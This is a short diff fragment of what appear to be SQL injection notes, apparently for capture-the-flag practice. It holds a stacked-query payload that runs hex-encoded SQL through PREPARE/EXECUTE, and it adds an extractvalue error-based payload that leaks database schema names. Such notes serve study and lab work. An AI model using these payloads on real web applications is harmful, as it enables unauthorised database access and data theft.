@@ -28,4 +28,7 @@ Use preparestatement to execute query
 ```1'; prepare abc from 73656c65637420666c61672066726f6d20603139313938313039333131313435313460; execute abc```
 
 
+Sử dụng extractvalue: -1' and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata)))-- -
+
+
 
